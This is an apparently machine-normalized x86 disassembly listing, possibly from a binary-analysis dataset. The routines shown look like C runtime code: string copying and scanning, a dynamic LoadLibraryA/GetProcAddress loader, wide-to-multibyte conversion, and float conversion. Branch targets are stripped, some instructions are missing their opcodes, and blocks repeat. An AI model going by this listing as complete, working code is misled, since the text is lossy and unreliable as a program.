mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_44120e
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_44120e
pop ecx
push esi
call sub_44120e
pop ecx
sub_452d98
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_443b37
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440791
add esp 0x14
mov eax esi
jmp r-xdata
sub_452e10
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_452e60
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_452ea0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_452ede
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_44536f
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_445378
pop ecx
test eax eax
je r-xdata
push eax
call sub_445378
pop ecx
test eax eax
je r-xdata
push eax
call sub_445378
push [ rw-data ]
mov esi eax
call sub_445378
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_4452fd
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_4452fd
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_4452fd
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_4452fd
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_4452fd
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_445378
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_453047
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_453092
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_443b37
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_440791
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_443b37
mov [ eax ] 0x2a
call sub_443b37
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_443b37
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_440791
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_443360
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_443360
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_45321b
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_45375f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
